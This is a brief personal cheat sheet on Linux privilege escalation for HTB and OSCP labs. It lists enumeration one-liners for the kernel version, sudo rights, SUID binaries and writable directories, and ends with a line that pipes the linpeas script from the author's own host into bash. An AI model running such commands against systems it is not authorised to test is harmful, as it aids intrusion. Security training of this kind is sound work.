# Common Privesc Methods

For Linux privesc I usually like enumerating all directories and unusual files I have access too, and then, running a common binary and some one-liners.

## Identifying Privesc

### One-Liners

Run the following one-liners to enumerate your privs on the box:

- `uname -a` == Gives you linux kernel ver.
- `sudo -l` == Shows you where you have SUDO privs.
- `find / -perm -u=s -type f 2>/dev/null` == Locate SUID Binaries.
- `find / -writable -type d 2>/dev/null` == Locate files you have write access to.

These commands will find the majority of privesc vectors on HTB and OSCP. There is more commands you should try if these don't work but I usually head to linpeas after these.

### Linpeas

`curl -sL htttp://<myip>/linpeas.sh | bash`
